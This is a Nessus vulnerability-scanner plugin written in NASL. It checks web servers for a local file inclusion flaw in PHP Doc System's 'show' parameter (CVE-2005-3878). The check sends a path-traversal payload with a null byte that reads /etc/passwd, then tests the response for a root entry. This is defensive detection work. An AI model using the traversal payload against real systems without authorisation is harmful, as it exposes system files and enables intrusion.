#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by a
local file inclusion vulnerability. 

Description :

The remote host is running PHP Doc System, a modular, PHP-based system
for creating documentation. 

The version of PHP Doc System installed on the remote host fails to
sanitize user input to the 'show' parameter of the 'index.php' script
before using it in a PHP 'include' function.  An unauthenticated
attacker may be able to exploit this issue to view arbitrary files on
the remote host or to execute arbitrary PHP code taken from arbitrary
files on the remote host. 

See also :

http://pridels.blogspot.com/2005/11/php-doc-system-151-local-file.html

Solution :

Unknown at this time.

Risk factor :

Medium / CVSS Base Score : 4.6
(AV:R/AC:L/Au:NR/C:P/I:P/A:N/B:N)";


if (description) {
  script_id(20246);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-3878");
  script_bugtraq_id(15611);

  script_name(english:"PHP Doc System Show Parameter Local File Include Vulnerability");
  script_summary(english:"Checks for show parameter local file include vulnerability in PHP Doc System");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/documentation", "/docs", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read /etc/passwd.
  file = "../../../../../../../../../../../etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/index.php?",
      "show=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
      contents = res - strstr(res, "<br />");
      if (!strlen(contents)) contents = res;

      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        contents
      );
    security_warning(port:port, data:report);
    exit(0);
  }
}
